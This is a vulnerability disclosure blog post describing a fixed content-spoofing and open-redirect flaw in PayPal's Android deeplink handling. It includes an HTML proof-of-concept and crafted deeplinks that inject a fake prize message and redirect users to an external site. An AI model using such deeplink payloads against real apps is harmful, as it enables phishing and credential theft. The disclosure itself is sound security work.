---
date: "2026-10-16T12:03:23+08:00"
draft: false
title: "Arbitrary Content and URL Injection in Paypal via Deeplink"
summary: "A content spoofing vulnerability exists due to unsanitized parameters, allowing in Arbitrary Text and URL injection in Paypal Android."

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

## **Summary**
A content spoofing vulnerability exists due to unsanitized parameters, resulting in arbitrary text and URL injection. This allows attackers to redirect PayPal users to external links, compromising their credentials via phishing and facilitating various other malicious activities.

## **Exploit**
An attacker hosts a web server with a crafted HTML page. When the page loads, it triggers a deeplink.
```html
<!DOCTYPE html>
<HTML>
<head><title>Exploit PoC</title></head>
  <body><center>
   <a href="paypal://eof_cross_sell?title=Congrats! You have won $10,000 sponsored by Paypal&amp;subtitle=To claim your prize, tap the Done button&amp;context_source=send_money&amp;sub_flow=default&amp;navigate_to_after_exit=https://nmochea.github.io"><h1>Begin Attack!</h1></a>
  </body>
</html>
```

## **Technical Details**
This vulnerability is caused by the PayPal application's failure to properly sanitize user-supplied data passed through deeplink parameters. An attacker can supply crafted content via a parameter value, which is then reflected back to the user within the PayPal app, causing the user to see a modified page that appears to originate from a trusted PayPal context.

Most content spoofing cases rely on social engineering: the injected URL is visible within the displayed content, and the attack only succeeds if the user manually types or visits it. This case is different the malicious URL is never shown to the user at all. It sits hidden in the `navigate_to_after_exit` parameter, and a single tap on the "Done" button is enough to trigger the redirect, with no third-party app installation or physical device access required.

**In `res/values/strings.xml:`**
```xml
<string name="send_money_success_x_sell_deeplink">paypal://eof_cross_sell?title=%1$s&amp;subtitle=%2$s&amp;context_source=send_money&amp;sub_flow=default&amp;navigate_to_after_exit=paypal://dashboard</string>
```
This string shows that the PayPal deeplink reflects the `title`, `subtitle`, and `navigate_to_after_exit` parameters in the PayPal Android app without sanitization.

**Deeplink Testing**

The interesting part of this vulnerability is what happens after injecting arbitrary text into the PayPal Android app and tapping "Done." By default, the deeplink redirects to `paypal://dashboard`:
```xml
paypal://eof_cross_sell?title=Congrats! You have won $10,000 sponsored by Paypal&amp;subtitle=To claim your prize, tap the Done button&amp;context_source=send_money&amp;sub_flow=default&amp;navigate_to_after_exit=paypal://dashboard
```

Since the application performs a redirect based on this parameter, I modified `navigate_to_after_exit` to point to an external URL instead:

```xml
paypal://eof_cross_sell?title=Congrats! You have won $10,000 sponsored by Paypal&amp;subtitle=To claim your prize, tap the Done button&amp;context_source=send_money&amp;sub_flow=default&amp;navigate_to_after_exit=https://nmochea.github.io
```

After tapping "Done," the app redirected to `https://nmochea.github.io` in the external browser — confirming that the `navigate_to_after_exit` parameter is not sanitized, allowing an attacker to trigger navigation to an arbitrary external URL through the PayPal deeplink.

## **Timeline**
- **November 26, 2023** — Reported to HackerOne
- **November 26, 2023** — Triaged by the team
- **February 29, 2024** — Rewarded with an $800 bounty
- **April 25, 2024** — Fixed & Resolved